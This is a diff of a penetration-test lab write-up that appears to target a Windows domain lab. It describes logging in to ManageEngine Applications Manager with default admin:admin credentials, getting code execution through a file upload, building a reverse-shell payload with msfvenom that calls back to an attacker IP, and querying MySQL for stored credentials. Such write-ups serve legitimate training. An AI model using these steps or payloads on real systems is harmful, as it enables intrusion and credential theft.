@@ -68,6 +68,8 @@ This is the **Domain Controller** for the `secura.yzx` domain, running Windows S
 
 ## 4.0 Enumeration — ManageEngine Applications Manager
 
+Section 3.1 found ManageEngine Applications Manager on port 8443. Now we dig into it.
+
 ### 4.1 Default Administrative Credentials
 
 Opening `https://192.168.216.95:8443` shows the ManageEngine Applications Manager 14 login page. It still uses the **default credentials `admin:admin`** — nobody ever changed them.
@@ -90,7 +92,7 @@ Once logged in, we found a **file upload** feature. It accepts **any file type**
 
 ### 5.1 Remote Code Execution via File Upload
 
-We built a Windows x64 reverse-shell payload with `msfvenom`:
+The upload feature from section 4.2 runs anything that lands in `working\`. To turn that into a shell, we built a Windows x64 reverse-shell payload with `msfvenom`:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=1234 -f exe -o 1.exe
@@ -322,7 +324,7 @@ No cached domain logins on ERA.
 
 ### 9.1 charlotte's Credentials — from the MySQL creds table
 
-We already had MySQL root access on ERA (from the UDF escalation in section 7.0). While digging for more credentials, we queried the databases and found one called `creds` that does not exist in a standard XAMPP install:
+The credential dump in section 8.0 gave us local administrator credentials, but no path into the domain. We still had MySQL root access on ERA (from the UDF escalation in section 7.0), so we looked there and found a database called `creds` that does not exist in a standard XAMPP install:
 
 ```powershell
 C:\xampp\mysql\bin\mysql.exe -u root -e "SHOW DATABASES;"
